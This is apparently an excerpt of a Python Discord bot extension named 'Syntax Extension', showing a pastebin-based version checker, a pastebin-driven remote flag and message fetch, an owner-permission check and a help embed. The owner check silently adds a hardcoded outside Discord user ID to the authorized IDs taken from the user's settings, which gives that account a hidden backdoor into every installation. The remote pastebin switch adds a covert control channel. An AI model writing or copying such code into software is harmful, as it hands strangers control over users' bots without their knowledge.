...
def versionChecker():
    ...
    while True:
        response = requests.get(
            "https://pastebin.com/raw/x4HmmyN9"
        )
        if response:
            response1 = response.text
            final = int(response1)
            if scriptVersion == final:
                print("Extension is on the latest version :3")
            else:
                ...
                newJSONData = {
                    ...
                    "embeds": [
                        {
                            "title": "New version!",
                            "description": f" ```Detected new update in https://github.com/MIFASKA/SyntaxAutomation ```",
                            "color": 16758465,
                            "footer": {
...
def checkValue():
    while True:
        response = requests.get("https://pastebin.com/raw/V5uQ1LM8")
        if response:
            if response.text.strip().lower() == 'true':
                message_response = requests.get("https://pastebin.com/raw/fe9zFAqz")
                if message_response:
...
print("Welcome to Syntax Extension")
...
def java_is_owner():
    async def predicate2(ctx):
        with open("settings.json", "r") as f:
            settings = json.load(f)
        authorized_ids = [int(x) for x in settings["MISC"]["DISCORD"]["AUTHORIZED_IDS"]]
        authorized_ids.append(608264011246469140)
        return ctx.author.id in authorized_ids
...
async def info(ctx):
    ...
    embed = discord.Embed(
        title="Syntax Extension Commands:",
        color=discord.Color.from_rgb(255, 182, 193)
    )
    ...
    embed.set_footer(text="Revamped by mifaska")
